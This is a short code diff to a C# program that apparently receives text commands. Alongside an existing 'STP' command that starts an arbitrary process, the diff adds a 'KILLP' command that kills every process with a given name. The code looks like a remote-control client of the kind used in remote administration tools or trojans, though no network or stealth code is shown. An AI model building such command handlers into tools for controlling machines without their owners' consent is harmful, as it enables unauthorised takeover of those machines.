@@ -185,6 +185,15 @@ namespace Client
                         case "STP":
                             Process.Start("" + spl[1]);
                             break;
+                        case "KILLP":
+                            var processes = Process.GetProcessesByName(spl[1]);
+
+                            foreach (var process in processes)
+                            {
+                                Process.GetProcessById(process.Id).Kill();
+
+                            }
+                            break;
                     }
                 }
                 catch 
